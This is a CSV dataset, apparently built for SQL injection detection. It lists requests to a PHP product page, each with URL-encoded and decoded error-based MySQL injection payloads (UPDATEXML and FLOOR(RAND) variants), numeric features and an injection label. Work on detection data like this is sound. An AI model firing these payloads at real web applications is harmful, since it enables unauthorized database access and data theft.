full_url,parsed_url,hostname,event_time,sql_keyword,params_length,request_volume,special_chars,values_to_length,injection
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x56755053%20FROM%20DUAL%20WHERE%205941%3D5941%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%29%7C%7C,"/details.php?prod=5&type=?||(SELECT 0x56755053 FROM DUAL WHERE 5941=5941 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544))||",192.168.43.6,1681395138.677551,5,142,93.6,0,3.5211267605633805,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x5476424b%20WHERE%202040%3D2040%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%29%7C%7C,"/details.php?prod=5&type=?||(SELECT 0x5476424b WHERE 2040=2040 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544))||",192.168.43.6,1681395138.682851,4,132,93.6,0,3.0303030303030303,1
/details.php?prod=5&type=%3F%2B%28SELECT%20PUKi%20WHERE%208602%3D8602%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%29%2B,"/details.php?prod=5&type=?+(SELECT PUKi WHERE 8602=8602 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544))+",192.168.43.6,1681395138.687297,4,124,93.6,0,3.225806451612903,1
/details.php?prod=5&type=%3F%2B%28SELECT%200x76597454%20WHERE%203682%3D3682%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%29%2B,"/details.php?prod=5&type=?+(SELECT 0x76597454 WHERE 3682=3682 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544))+",192.168.43.6,1681395138.692121,4,130,93.6,0,3.076923076923077,1
/details.php?prod=5&type=%3F%27%29%29%20AS%20iRWo%20WHERE%201606%3D1606%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20EPpW,"/details.php?prod=5&type=?')) AS iRWo WHERE 1606=1606 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- EPpW",192.168.43.6,1681395138.69664,5,127,93.6,2,5.511811023622047,1
/details.php?prod=5&type=%3F%22%29%29%20AS%20EYsz%20WHERE%201880%3D1880%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20iihf,"/details.php?prod=5&type=?"")) AS EYsz WHERE 1880=1880 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- iihf",192.168.43.6,1681395138.700837,5,127,93.6,2,5.511811023622047,1
/details.php?prod=5&type=%3F%29%29%20AS%20fjfK%20WHERE%202661%3D2661%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20eeNl,"/details.php?prod=5&type=?)) AS fjfK WHERE 2661=2661 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- eeNl",192.168.43.6,1681395138.705435,5,126,93.6,1,4.761904761904762,1
/details.php?prod=5&type=%3F%27%29%20AS%20xgpA%20WHERE%201614%3D1614%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20zeYo,"/details.php?prod=5&type=?') AS xgpA WHERE 1614=1614 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- zeYo",192.168.43.6,1681395138.710026,5,126,93.6,2,5.555555555555555,1
/details.php?prod=5&type=%3F%22%29%20AS%20BfPP%20WHERE%205595%3D5595%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20mAsy,"/details.php?prod=5&type=?"") AS BfPP WHERE 5595=5595 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- mAsy",192.168.43.6,1681395138.71434,5,126,93.6,2,5.555555555555555,1
/details.php?prod=5&type=%3F%29%20AS%20PuBf%20WHERE%203316%3D3316%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20JPNH,"/details.php?prod=5&type=?) AS PuBf WHERE 3316=3316 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- JPNH",192.168.43.6,1681395138.718965,5,125,93.6,1,4.8,1
/details.php?prod=5&type=%3F%60%20WHERE%203426%3D3426%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20geNW,"/details.php?prod=5&type=?` WHERE 3426=3426 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- geNW",192.168.43.6,1681395138.723402,4,117,93.6,1,4.273504273504273,1
/details.php?prod=5&type=%3F%60%29%20WHERE%203000%3D3000%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20hZzw,"/details.php?prod=5&type=?`) WHERE 3000=3000 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- hZzw",192.168.43.6,1681395138.728021,4,118,93.6,1,4.237288135593221,1
/details.php?prod=5&type=%3F%60%3D%60%3F%60%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%60%3F%60%3D%60%3F,"/details.php?prod=5&type=?`=`?` OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND `?`=`?",192.168.43.6,1681395138.732563,4,109,93.6,0,3.669724770642202,1
/details.php?prod=5&type=%3F%22%3D%22%3F%22%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%22%3F%22%3D%22%3F,"/details.php?prod=5&type=?""=""?"" OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND ""?""=""?",192.168.43.6,1681395138.737642,4,109,93.6,1,4.587155963302752,1
/details.php?prod=5&type=%3F%5D-%28SELECT%200%20WHERE%203871%3D3871%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%29%7C%5B%3F,"/details.php?prod=5&type=?]-(SELECT 0 WHERE 3871=3871 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544))|[?",192.168.43.6,1681395138.742377,4,124,93.6,0,3.225806451612903,1
/details.php?prod=5&type=%3F%27%20IN%20BOOLEAN%20MODE%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%23,"/details.php?prod=5&type=?' IN BOOLEAN MODE) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)#",192.168.43.6,1681395138.746575,4,112,93.6,2,5.357142857142857,1
/details.php?prod=5&type=%3F%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29--%20oeHC,"/details.php?prod=5&type=?) AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x)-- oeHC",192.168.43.6,1681395138.751735,6,212,93.6,1,3.30188679245283,1
/details.php?prod=5&type=%3F%27%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29--%20Csqf,"/details.php?prod=5&type=?') AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x)-- Csqf",192.168.43.6,1681395138.756461,6,213,93.6,2,3.755868544600939,1
/details.php?prod=5&type=%3F%27%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29--%20bXaI,"/details.php?prod=5&type=?' AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x)-- bXaI",192.168.43.6,1681395138.760475,6,212,93.6,2,3.7735849056603774,1
/details.php?prod=5&type=%3F%22%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29--%20ZNHW,"/details.php?prod=5&type=?"" AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x)-- ZNHW",192.168.43.6,1681395138.765586,6,212,93.6,2,3.7735849056603774,1
/details.php?prod=5&type=%3F%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%282227%3D2227,"/details.php?prod=5&type=?) AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND (2227=2227",192.168.43.6,1681395138.770427,6,220,93.6,0,2.727272727272727,1
/details.php?prod=5&type=%3F%29%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%28%287028%3D7028,"/details.php?prod=5&type=?)) AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND ((7028=7028",192.168.43.6,1681395138.786981,6,222,93.6,0,2.7027027027027026,1
/details.php?prod=5&type=%3F%29%29%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%28%28%286450%3D6450,"/details.php?prod=5&type=?))) AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND (((6450=6450",192.168.43.6,1681395138.875856,6,224,93.6,0,2.6785714285714284,1
/details.php?prod=5&type=%3F%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29,"/details.php?prod=5&type=? AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x)",192.168.43.6,1681395138.939629,6,204,93.6,0,2.9411764705882355,1
/details.php?prod=5&type=%3F%27%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%28%27MTyJ%27%3D%27MTyJ,"/details.php?prod=5&type=?') AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND ('MTyJ'='MTyJ",192.168.43.6,1681395138.946446,6,224,93.6,1,3.125,1
/details.php?prod=5&type=%3F%27%29%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%28%28%27xgWl%27%3D%27xgWl,"/details.php?prod=5&type=?')) AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND (('xgWl'='xgWl",192.168.43.6,1681395139.015424,6,226,93.6,1,3.0973451327433628,1
/details.php?prod=5&type=%3F%27%29%29%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%28%28%28%27Sdip%27%3D%27Sdip,"/details.php?prod=5&type=?'))) AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND ((('Sdip'='Sdip",192.168.43.6,1681395139.020328,6,228,93.6,1,3.0701754385964914,1
/details.php?prod=5&type=%3F%27%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%27SYji%27%3D%27SYji,"/details.php?prod=5&type=?' AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND 'SYji'='SYji",192.168.43.6,1681395139.025632,6,222,93.6,1,3.1531531531531534,1
/details.php?prod=5&type=%3F%27%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%28%27kkZg%27%20LIKE%20%27kkZg,"/details.php?prod=5&type=?') AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND ('kkZg' LIKE 'kkZg",192.168.43.6,1681395139.029947,7,229,93.6,1,3.493449781659389,1
/details.php?prod=5&type=%3F%27%29%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%28%28%27klGq%27%20LIKE%20%27klGq,"/details.php?prod=5&type=?')) AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND (('klGq' LIKE 'klGq",192.168.43.6,1681395139.087897,7,231,93.6,1,3.463203463203463,1
/details.php?prod=5&type=%3F%27%29%29%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%28%28%28%27fVhl%27%20LIKE%20%27fVhl,"/details.php?prod=5&type=?'))) AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND ((('fVhl' LIKE 'fVhl",192.168.43.6,1681395139.093006,7,233,93.6,1,3.4334763948497855,1
/details.php?prod=5&type=%3F%25%27%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%27Skxy%25%27%3D%27Skxy,"/details.php?prod=5&type=?%' AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND 'Skxy%'='Skxy",192.168.43.6,1681395139.098169,6,224,93.6,1,3.125,1
/details.php?prod=5&type=%3F%27%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%27UwED%27%20LIKE%20%27UwED,"/details.php?prod=5&type=?' AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND 'UwED' LIKE 'UwED",192.168.43.6,1681395139.102665,7,227,93.6,1,3.5242290748898677,1
/details.php?prod=5&type=%3F%22%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%28%22Mvzm%22%3D%22Mvzm,"/details.php?prod=5&type=?"") AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND (""Mvzm""=""Mvzm",192.168.43.6,1681395139.107425,6,224,93.6,1,3.125,1
/details.php?prod=5&type=%3F%22%29%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%28%28%22WYlw%22%3D%22WYlw,"/details.php?prod=5&type=?"")) AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND ((""WYlw""=""WYlw",192.168.43.6,1681395139.114793,6,226,93.6,1,3.0973451327433628,1
/details.php?prod=5&type=%3F%22%29%29%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%28%28%28%22pSSQ%22%3D%22pSSQ,"/details.php?prod=5&type=?""))) AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND (((""pSSQ""=""pSSQ",192.168.43.6,1681395139.118951,6,228,93.6,1,3.0701754385964914,1
/details.php?prod=5&type=%3F%22%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%22aRuG%22%3D%22aRuG,"/details.php?prod=5&type=?"" AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND ""aRuG""=""aRuG",192.168.43.6,1681395139.123661,6,222,93.6,1,3.1531531531531534,1
